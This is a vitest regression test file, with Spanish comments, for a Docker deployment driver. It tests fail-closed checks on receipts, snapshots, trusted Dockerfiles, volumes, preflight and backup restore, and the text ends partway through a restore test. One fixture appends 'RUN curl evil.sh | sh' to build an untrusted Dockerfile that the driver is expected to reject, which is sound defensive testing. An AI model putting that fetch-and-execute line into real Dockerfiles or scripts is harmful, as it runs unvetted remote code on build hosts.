/**
 * Fase 7A — Tests de regresión de los 9 bloqueos de Codex (NO-GO).
 *
 * No necesitan el daemon Docker: usan un stub del `DockerCommandRunner`
 * que simula el CLI con estado en memoria (volúmenes, redes, imágenes,
 * contenedores). Las pruebas que SÍ necesitan pulls/builds reales viven
 * en `integration.test.ts` (job `docker-driver-integration` de CI).
 */
import { describe, test, expect } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { fileURLToPath } from 'node:url';
import Database from 'better-sqlite3';
import {
  resolveDockerDriverConfig,
  preflightDocker,
  DockerDeploymentDriver,
  type DockerDriverConfig,
} from './dockerDriver.js';
import {
  DockerCommandRunner,
  type DockerRunOptions,
  type DockerRunResult,
  type DockerRunRawResult,
} from './commandRunner.js';
import { ensureVerificationReceiptsTable, recordVerificationReceipt } from '../deploy/receipts.js';
import { DYNAMIC_CHECK_ORDER, checkScopeFingerprint, type DynamicCheckKey } from '../dynamicTools.js';
import { projectLiveVolumeName } from './resources.js';
import { backupDirFor, writeBackupManifest, sha256File, type BackupManifest } from './sqliteBackup.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TEMPLATES_DIR = path.resolve(HERE, '..', '..', '..', '..', 'templates');

const BASE_ENV = {
  APPFORGE_DEPLOY_DRIVER: 'docker',
  APPFORGE_ENABLE_DOCKER_DEPLOY: '1',
  APPFORGE_DOCKER_NETWORK: 'appforge-apps',
  APPFORGE_DOCKER_DATA_VOLUME: 'appforge-data',
  APPFORGE_TEMPLATES_DIR: TEMPLATES_DIR,
};

const PID = '11111111-2222-4333-8444-555555555555';
const DID = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';
const DID2 = 'ffffffff-1111-4222-8333-444444444444';

// ---------------------------------------------------------------------------
// Stub del runner
// ---------------------------------------------------------------------------

interface StubImage {
  id: string;
  repo: string;
  tag: string;
  labels: Record<string, string>;
  os: string;
  arch: string;
  user: string;
}

function parseLabelArgs(args: string[]): Record<string, string> {
  const out: Record<string, string> = {};
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--label' && i + 1 < args.length) {
      const v = args[i + 1]!;
      const eq = v.indexOf('=');
      if (eq > 0) out[v.slice(0, eq)] = v.slice(eq + 1);
      i++;
    }
  }
  return out;
}

class StubDocker {
  calls: string[][] = [];
  volumes = new Map<string, Record<string, string>>();
  networks = new Map<string, { internal: boolean; labels: Record<string, string> }>();
  images = new Map<string, StubImage>(); // por ref o id
  containers = new Map<string, unknown>();
  /** ids de imagen con contenedores (ps -a --filter ancestor=). */
  psAncestorHits = new Set<string>();
  /** Contenido servido al copiar DESDE un contenedor al host (verify). */
  hostFiles = new Map<string, Buffer>();
  /**
   * Plantilla de inspect para contenedores creados con `docker run --name`.
   * Se deep-copia bajo el nombre indicado con State.Running=true.
   */
  containerTemplate: unknown = undefined;
  /** Labels que `inspect` devuelve para una imagen (por id), simulando cambio entre listado e inspección. */
  inspectLabelOverride = new Map<string, Record<string, string>>();
  /** Arquitectura que `docker info --format '{{.Architecture}}'` reporta (defecto: x86_64). */
  daemonArch = 'x86_64';

  private deepCopy<T>(v: T): T {
    return JSON.parse(JSON.stringify(v)) as T;
  }

  private okRes(stdout = '', stderr = ''): DockerRunResult {
    return { code: 0, signal: null, stdout, stderr, truncated: false, timedOut: false, aborted: false, durationMs: 1 };
  }
  private failRes(code: number, stderr: string): DockerRunResult {
    return { code, signal: null, stdout: '', stderr, truncated: false, timedOut: false, aborted: false, durationMs: 1 };
  }

  async run(options: DockerRunOptions): Promise<DockerRunResult> {
    const args = options.args;
    this.calls.push([...args]);
    const [sub, second] = args;
    const last = args[args.length - 1]!;

    // docker inspect <name> (genérico)
    if (sub === 'inspect') {
      const name = second!;
      const v = this.volumes.get(name);
      if (v) return this.okRes(JSON.stringify([{ Name: name, Labels: v }]));
      const n = this.networks.get(name);
      if (n) return this.okRes(JSON.stringify([{ Name: name, Internal: n.internal, Labels: n.labels }]));
      const c = this.containers.get(name);
      if (c !== undefined) return this.okRes(JSON.stringify([c]));
      const img = this.images.get(name);
      if (img) {
        const labels = this.inspectLabelOverride.get(img.id) ?? img.labels;
        return this.okRes(
          JSON.stringify([
            {
              Id: img.id,
              RepoTags: [`${img.repo}:${img.tag}`],
              Os: img.os,
              Architecture: img.arch,
              Config: { User: img.user, Labels: labels, Image: `${img.repo}:${img.tag}` },
            },
          ]),
        );
      }
      return this.failRes(1, `Error: No such object: ${name}`);
    }
    // docker network inspect / volume inspect (preflight)
    if ((sub === 'network' || sub === 'volume') && second === 'inspect') {
      const name = args[2]!;
      if (sub === 'network') {
        const n = this.networks.get(name);
        if (!n) return this.failRes(1, `Error: No such network: ${name}`);
        return this.okRes(JSON.stringify([{ Name: name, Internal: n.internal, Labels: n.labels }]));
      }
      const v = this.volumes.get(name);
      if (!v) return this.failRes(1, `Error: No such volume: ${name}`);
      return this.okRes(JSON.stringify([{ Name: name, Labels: v }]));
    }
    if (sub === 'volume' && second === 'create') {
      this.volumes.set(last, parseLabelArgs(args));
      return this.okRes(last + '\n');
    }
    if (sub === 'volume' && second === 'rm') {
      const name = args[2]!;
      if (!this.volumes.has(name)) return this.failRes(1, `Error: No such volume: ${name}`);
      this.volumes.delete(name);
      return this.okRes(name + '\n');
    }
    if (sub === 'network' && second === 'create') {
      this.networks.set(last, { internal: args.includes('--internal'), labels: parseLabelArgs(args) });
      return this.okRes(last + '\n');
    }
    if (sub === 'network' && second === 'rm') {
      this.networks.delete(args[2]!);
      return this.okRes('');
    }
    // docker build -t <ref> --label ... : registra la imagen con sus labels.
    if (sub === 'build' || sub === 'buildx') {
      const tIdx = args.indexOf('-t');
      const ref = tIdx >= 0 ? args[tIdx + 1]! : `appforge/app-unknown:latest`;
      const [repo, tag] = ref.includes(':') ? ref.split(':') : [ref, 'latest'];
      const id = `sha256:${'b'.repeat(64)}`;
      this.images.set(ref, {
        id,
        repo: repo!,
        tag: tag!,
        labels: parseLabelArgs(args),
        os: 'linux',
        arch: 'amd64',
        user: '1001',
      });
      this.images.set(id, this.images.get(ref)!);
      return this.okRes('build ok\n');
    }
    if (sub === 'images') {
      const seen = new Set<string>();
      const lines: string[] = [];
      for (const img of this.images.values()) {
        if (seen.has(img.id)) continue;
        seen.add(img.id);
        lines.push(
          JSON.stringify({
            ID: img.id,
            Repository: img.repo,
            Tag: img.tag,
            Labels: Object.entries(img.labels)
              .map(([k, v]) => `${k}=${v}`)
              .join(','),
          }),
        );
      }
      return this.okRes(lines.join('\n') + '\n');
    }
    if (sub === 'ps') {
      const fIdx = args.findIndex((a) => a.startsWith('ancestor='));
      if (fIdx >= 0) {
        const id = args[fIdx]!.slice('ancestor='.length);
        return this.okRes(this.psAncestorHits.has(id) ? 'deadbeef1234\n' : '');
      }
      return this.okRes('');
    }
    if (sub === 'rmi') {
      const ref = args[1]!;
      const img = this.images.get(ref);
      if (img) {
        for (const [k, v] of [...this.images.entries()]) if (v.id === img.id) this.images.delete(k);
      }
      return this.okRes(`Untagged: ${ref}\n`);
    }
    if (sub === 'cp') {
      // <contenedor>:/data/<name> -> <ruta host>: servir contenido configurado.
      // args = ['cp', <origen>, <destino>].
      const src: string = args[1] ?? '';
      const dst: string = args[2] ?? '';
      const marker = ':/data/';
      const mi = src.indexOf(marker);
      if (mi > 0 && !src.slice(0, mi).includes(':') && path.isAbsolute(dst)) {
        const buf = this.hostFiles.get(src.slice(mi + marker.length));
        if (!buf) return this.failRes(1, `Error: No such file: ${src}`);
        fs.mkdirSync(path.dirname(dst), { recursive: true });
        fs.writeFileSync(dst, buf);
      }
      return this.okRes('');
    }
    if (sub === 'version') return this.okRes('29.1.3\n');
    if (sub === 'info') {
      if (args.some((a) => a.includes('Architecture'))) return this.okRes(this.daemonArch + '\n');
      return this.okRes(JSON.stringify({ ServerVersion: '29.1.3' }));
    }
    // docker run --name <n>: registrar el contenedor desde la plantilla.
    if (sub === 'run') {
      const nIdx = args.indexOf('--name');
      if (nIdx >= 0 && this.containerTemplate !== undefined) {
        const entry = this.deepCopy(this.containerTemplate) as { State?: { Running?: boolean } };
        entry.State = { Running: true };
        this.containers.set(args[nIdx + 1]!, entry);
      }
      return this.okRes('');
    }
    // docker stop <n>: marcar detenido.
    if (sub === 'stop') {
      const entry = this.containers.get(args[args.length - 1]!) as { State?: { Running?: boolean } } | undefined;
      if (entry?.State) entry.State.Running = false;
      return this.okRes('');
    }
    // docker start <n>: marcar en marcha.
    if (sub === 'start') {
      const entry = this.containers.get(args[args.length - 1]!) as { State?: { Running?: boolean } } | undefined;
      if (entry?.State) entry.State.Running = true;
      return this.okRes('');
    }
    // docker rm <n>: eliminar el contenedor del mapa.
    if (sub === 'rm' && this.containers.has(args[1]!)) {
      this.containers.delete(args[1]!);
      return this.okRes('');
    }
    // create/rm/start/kill/logs/wait: éxito sin estado.
    return this.okRes('');
  }

  async runRaw(options: DockerRunOptions): Promise<DockerRunRawResult> {
    const r = await this.run(options);
    // `docker cp <c>:/app -` en validateImage: simular ausencia de /app.
    if (options.args[0] === 'cp' && options.args[1]!.endsWith(':/app')) {
      return { code: 1, signal: null, stdoutBytes: Buffer.alloc(0), stderr: 'no such file or directory', truncated: false, timedOut: false, aborted: false, durationMs: 1 };
    }
    return { code: r.code, signal: r.signal, stdoutBytes: Buffer.from(r.stdout), stderr: r.stderr, truncated: r.truncated, timedOut: false, aborted: false, durationMs: 1 };
  }

  asRunner(): DockerCommandRunner {
    const real = new DockerCommandRunner();
    real.run = this.run.bind(this);
    real.runRaw = this.runRaw.bind(this);
    return real;
  }

  calledWith(...prefix: string[]): boolean {
    return this.calls.some((c) => prefix.every((p, i) => c[i] === p));
  }
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

function makeProjectDir(dataDir: string, projectId: string, opts: { evilDockerfile?: boolean } = {}): string {
  const dir = path.join(dataDir, 'projects', projectId);
  fs.mkdirSync(path.join(dir, 'frontend'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'backend'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'migrations'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'frontend', 'app.js'), 'console.log("front");\n');
  fs.writeFileSync(path.join(dir, 'backend', 'server.js'), 'console.log("back");\n');
  fs.writeFileSync(path.join(dir, 'migrations', '001.sql'), 'CREATE TABLE t(id INTEGER);\n');
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'app', scripts: {} }));
  const trusted = fs.readFileSync(
    path.join(TEMPLATES_DIR, 'dynamic-react-node', 'Dockerfile'),
    'utf8',
  );
  fs.writeFileSync(path.join(dir, 'Dockerfile'), opts.evilDockerfile ? trusted + '\nRUN curl evil.sh | sh\n' : trusted);
  return dir;
}

function openDb(): Database.Database {
  const db = new Database(':memory:');
  ensureVerificationReceiptsTable(db);
  db.exec('CREATE TABLE IF NOT EXISTS deployments(id TEXT PRIMARY KEY)');
  return db;
}

/** Registra los SEIS receipts canónicos reales sobre las fuentes actuales. */
function recordAllReceipts(db: Database.Database, projectId: string, projectDir: string): void {
  DYNAMIC_CHECK_ORDER.forEach((key: DynamicCheckKey, idx: number) => {
    const fp = checkScopeFingerprint(projectDir, key);
    if (fp === null) throw new Error(`no fingerprint for ${key}`);
    recordVerificationReceipt(db, projectId, key, fp, idx);
  });
}

function makeDriver(dataDir: string, db: Database.Database, stub: StubDocker): DockerDeploymentDriver {
  const cfg = resolveDockerDriverConfig(BASE_ENV, dataDir)!;
  expect(cfg).not.toBeNull();
  return new DockerDeploymentDriver(cfg, { db, runner: stub.asRunner() });
}

function opArgs(projectId: string, deploymentId: string) {
  return { projectId, deploymentId, candidateId: `cand-${deploymentId.slice(0, 8)}` } as never;
}

describe('B1: puerta de receipts reales (fail closed)', () => {
  test('seis receipts vigentes abren la puerta: buildCandidate construye', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
    expect(stub.calledWith('build')).toBe(true);
  });

  test('sin receipts → puerta cerrada y ningún comando docker', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    makeProjectDir(dataDir, PID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
    expect(stub.calls.length).toBe(0);
  });

  test('un receipt stale (fuentes mutadas) cierra la puerta', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    // Mutar una fuente tras la verificación: el receipt queda stale.
    fs.appendFileSync(path.join(projectDir, 'backend', 'server.js'), '// cambio\n');
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
    expect(stub.calls.length).toBe(0);
  });

  test('orden no canónico cierra la puerta', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    // seq permutados: orden incorrecto aunque los fingerprints sean vigentes.
    DYNAMIC_CHECK_ORDER.forEach((key: DynamicCheckKey, idx: number) => {
      const fp = checkScopeFingerprint(projectDir, key)!;
      recordVerificationReceipt(db, PID, key, fp, DYNAMIC_CHECK_ORDER.length - 1 - idx);
    });
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
  });

  test('error de lectura de la DB cierra la puerta (fail closed)', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.close(); // la lectura lanzará
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE/);
    expect(stub.calls.length).toBe(0);
  });
});

describe('B2: fingerprints separados y snapshot verificado contra SQLite', () => {
  test('persiste fingerprint de fuentes y de snapshot por separado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
    const row = db
      .prepare('SELECT verified_source_fingerprint, snapshot_fingerprint, snapshot_path FROM deployments WHERE id=?')
      .get(DID) as Record<string, string | null>;
    expect(row.verified_source_fingerprint).toMatch(/^[0-9a-f]{64}$/i);
    expect(row.snapshot_fingerprint).toMatch(/^[0-9a-f]{64}$/i);
    expect(row.verified_source_fingerprint).not.toBe(row.snapshot_fingerprint);
    expect(row.snapshot_path).toContain(DID);
  });

  test('reutilizar snapshot sin registro en SQLite → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Borrar el registro: el snapshot en disco ya no es reutilizable.
    db.prepare('DELETE FROM deployments WHERE id=?').run(DID);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT_DB_MISMATCH/);
  });

  test('snapshot manipulado en disco → re-hash lo rechaza', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Manipular un fichero del snapshot: el re-hash debe detectarlo.
    const snapFile = path.join(dataDir, 'deploy-snapshots', DID, 'backend', 'server.js');
    fs.appendFileSync(snapFile, '// manipulado\n');
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT/);
  });

  test('ruta del snapshot distinta a la registrada → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    db.prepare('UPDATE deployments SET snapshot_path=? WHERE id=?').run('/tmp/otro-sitio', DID);
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT_DB_MISMATCH/);
  });
});

describe('B3: Dockerfile confiable byte a byte', () => {
  test('Dockerfile del proyecto distinto a la plantilla → fail closed', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    makeProjectDir(dataDir, PID, { evilDockerfile: true });
    recordAllReceipts(db, PID, path.join(dataDir, 'projects', PID));
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/DOCKERFILE_UNTRUSTED/);
    expect(stub.calledWith('build')).toBe(false);
  });

  test('.dockerignore manipulado en el snapshot → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Manipular el .dockerignore controlado dentro del snapshot ya creado.
    fs.writeFileSync(path.join(dataDir, 'deploy-snapshots', DID, '.dockerignore'), '# manipulado\n');
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/DOCKERIGNORE_UNTRUSTED/);
  });

  test('sin templatesDir → fail closed antes del build', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const cfg = resolveDockerDriverConfig({ ...BASE_ENV, APPFORGE_TEMPLATES_DIR: '' }, dataDir)!;
    const stub = new StubDocker();
    const d = new DockerDeploymentDriver(cfg, { db, runner: stub.asRunner() });
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/TEMPLATES_DIR_REQUIRED/);
    expect(stub.calledWith('build')).toBe(false);
  });
});

describe('B4: volumen live con identidad estable de proyecto', () => {
  /** Dos despliegues consecutivos comparten el MISMO volumen live. */
  test('dos despliegues exitosos consecutivos reutilizan el mismo volumen', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID2);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    expect((await d.buildCandidate(opArgs(PID, DID2))).ok).toBe(true);
    const liveVolume = projectLiveVolumeName(PID);

    // ensureLiveVolume es privado: se ejercita vía startCandidateAsLive.
    fs.writeFileSync(path.join(projectDir, '.env'), 'PORT=8080\n');
    const contInspect = (labels: Record<string, string>, imageRef: string) => ({
      Config: { Labels: labels, User: '1001', Image: imageRef },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    });

    const fp1 = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const img1 = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp1.slice(0, 12)}`;
    stub.containerTemplate = contInspect({
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp1,
    }, img1);
    const r1 = await d.startCandidateAsLive(opArgs(PID, DID));
    expect(r1.ok).toBe(true);

    // Segundo despliegue: el volumen live ya existe con labels estables.
    const fp2 = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID2) as { f: string }).f;
    const img2 = `appforge/app-${PID.slice(0, 8)}:dep-${DID2.slice(0, 8)}-${fp2.slice(0, 12)}`;
    stub.containerTemplate = contInspect({
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID2,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp2,
    }, img2);
    const before = stub.calls.filter((c) => c[0] === 'volume' && c[1] === 'create').length;
    const r2 = await d.startCandidateAsLive(opArgs(PID, DID2));
    expect(r2.ok).toBe(true);
    const after = stub.calls.filter((c) => c[0] === 'volume' && c[1] === 'create').length;
    expect(after).toBe(before); // no se creó ningún volumen nuevo

    // El volumen live existe UNA vez, con labels estables (sin deployment ni fingerprint).
    const vols = [...stub.volumes.entries()].filter(([n]) => n === liveVolume);
    expect(vols.length).toBe(1);
    const labels = vols[0]![1];
    expect(labels['com.appforge.managed']).toBe('true');
    expect(labels['com.appforge.project-id']).toBe(PID);
    expect(labels['com.appforge.role']).toBe('live');
    expect(labels['com.appforge.deployment-id']).toBeUndefined();
    expect(labels['com.appforge.source-fingerprint']).toBeUndefined();
    // Nunca se eliminó el volumen live.
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm' && c[2] === liveVolume)).toBe(false);
  });
});

describe('B5: preflight con propiedad exacta', () => {
  async function preflightCfg(dataDir: string, stub: StubDocker) {
    const sock = path.join(dataDir, 'docker.sock');
    const server = net.createServer();
    await new Promise<void>((res) => server.listen(sock, () => res()));
    const cfg = { ...resolveDockerDriverConfig(BASE_ENV, dataDir)!, socketPath: sock };
    return { cfg, server, sock, stub };
  }

  test('red existente no interna → falla sin modificarla', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: false, labels: { 'com.appforge.managed': 'true', 'com.appforge.component': 'network' } });
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/not internal/);
    expect(stub.networks.get('appforge-apps')!.internal).toBe(false); // intacta
    expect(stub.calledWith('network', 'rm')).toBe(false);
  });

  test('red existente con labels ajenas → falla sin modificarla', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: true, labels: { 'otra': 'cosa' } });
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/foreign\/missing labels/);
    expect(stub.networks.get('appforge-apps')!.labels).toEqual({ 'otra': 'cosa' });
  });

  test('volumen existente sin labels → falla sin modificarlo', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: true, labels: { 'com.appforge.managed': 'true', 'com.appforge.component': 'network' } });
    stub.volumes.set('appforge-data', {});
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/foreign\/missing labels/);
    expect(stub.volumes.has('appforge-data')).toBe(true);
    expect(stub.calledWith('volume', 'rm')).toBe(false);
  });

  test('camino feliz: crea red interna y volumen etiquetados', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(true);
    const n = stub.networks.get('appforge-apps')!;
    expect(n.internal).toBe(true);
    expect(n.labels['com.appforge.managed']).toBe('true');
    expect(n.labels['com.appforge.component']).toBe('network');
    const v = stub.volumes.get('appforge-data')!;
    expect(v['com.appforge.managed']).toBe('true');
    expect(v['com.appforge.component']).toBe('studio-data');
  });
});

describe('B6: restoreBackup endurecido', () => {
  const BACKUP_ID = 'bk_test_001';

  function restoreArgs() {
    return { projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, backupId: BACKUP_ID } as never;
  }

  /** Crea un backup válido en disco y devuelve sus bytes. */
  function makeValidBackup(dataDir: string): { bdir: string; bytes: Buffer } {
    const bdir = backupDirFor(dataDir, PID, BACKUP_ID);
    fs.mkdirSync(bdir, { recursive: true });
    const dbPath = path.join(bdir, 'app.db');
    const sdb = new Database(dbPath);
    sdb.exec('CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES (\'hola\');');
    sdb.close();
    const { size, sha256 } = sha256File(dbPath);
    const manifest: BackupManifest = {
      backupId: BACKUP_ID,
      projectId: PID,
      deploymentId: DID,
      createdAt: new Date().toISOString(),
      hadDatabase: true,
      files: [{ name: 'app.db', size, sha256 }],
    };
    writeBackupManifest(bdir, manifest);
    return { bdir, bytes: fs.readFileSync(dbPath) };
  }

  async function setupBuilt(dataDir: string, db: Database.Database, stub: StubDocker) {
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return d;
  }

  test('backup corrupto → rechazado ANTES de tocar el live', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    // Corromper el fichero en disco tras escribir el manifiesto.
    fs.appendFileSync(path.join(backupDirFor(dataDir, PID, BACKUP_ID), 'app.db'), 'corrupto');
    stub.hostFiles.set('app.db', bytes);
    // El live existe con datos (simulado).
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    });
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_FILE_CORRUPT/);
    // El live NO se tocó: ni stop, ni rm de contenedor, ni rm del volumen.
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm')).toBe(false);
    expect(stub.calls.some((c) => c[0] === 'stop' || c[0] === 'kill')).toBe(false);
  });

  test('volumen live ajeno sobrevive a restoreBackup', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    stub.hostFiles.set('app.db', bytes);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, { 'otra': 'etiqueta' }); // ajeno
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
